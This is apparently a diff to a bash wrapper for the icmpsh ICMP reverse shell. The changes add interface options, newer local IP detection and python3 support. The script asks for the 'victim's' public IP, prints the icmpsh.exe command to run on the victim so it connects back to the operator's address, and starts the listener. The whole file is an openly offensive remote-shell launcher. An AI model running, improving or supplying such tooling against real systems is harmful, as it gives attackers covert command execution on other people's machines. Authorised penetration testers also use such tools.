@@ -2,6 +2,39 @@
 # icmp shell script
 # Daniel Compton
 # 05/2013
+
+usage() {
+    echo "Usage: $0 [-i interface]"
+    echo ""
+    echo "Options:"
+    echo "  -i, --interface IFACE   Use a specific local interface (e.g. tun0, eth0)"
+    echo "  -h, --help              Show this help message"
+}
+
+INTERFACE=""
+while [ $# -gt 0 ]; do
+    case "$1" in
+        -i|--interface)
+            if [ -z "$2" ]; then
+                echo -e "\e[01;31m[!]\e[00m Missing value for $1"
+                usage
+                exit 1
+            fi
+            INTERFACE="$2"
+            shift 2
+            ;;
+        -h|--help)
+            usage
+            exit 0
+            ;;
+        *)
+            echo -e "\e[01;31m[!]\e[00m Unknown argument: $1"
+            usage
+            exit 1
+            ;;
+    esac
+done
+
 echo ""
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
@@ -13,8 +46,29 @@ echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 
 echo ""
-IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
+IP=""
+
+if [ -n "$INTERFACE" ]; then
+    IP=$(ip -4 -o addr show dev "$INTERFACE" scope global 2>/dev/null | awk '{split($4, a, "/"); print a[1]; exit}')
+    if [ -z "$IP" ]; then
+        echo -e "\e[01;31m[!]\e[00m Could not determine an IPv4 address for interface '$INTERFACE'."
+        exit 1
+    fi
+else
+    IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+
+    if [ -z "$IP" ]; then
+        IP=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')
+    fi
+
+    if [ -z "$IP" ]; then
+        echo -e "\e[01;31m[!]\e[00m Could not determine local IPv4 address automatically."
+        echo -e "\e[01;31m[!]\e[00m Re-run with -i <interface> to choose the correct one."
+        exit 1
+    fi
+fi
+
+echo -e "\e[01;32m[-]\e[00m Using local IP address: $IP${INTERFACE:+ (interface: $INTERFACE)}"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
 echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
@@ -24,7 +78,7 @@ echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the 
 echo ""
 echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 echo ""
-echo "icmpsh.exe -t "$IP" -d 500 -b 30 -s 128"
+echo "icmpsh.exe -t $IP -d 500 -b 30 -s 128"
 echo ""
 echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 echo ""
@@ -41,7 +95,7 @@ fi
 echo ""
 echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
 echo ""
-python icmpsh_m.py "$IP" "$VICTIM"
+python3 icmpsh_m.py "$IP" "$VICTIM"
 if [ "$ICMPDIS" = "disabled" ]
                 then
                                 echo ""
@@ -53,4 +107,3 @@ if [ "$ICMPDIS" = "disabled" ]
 fi
 
 exit 0
-
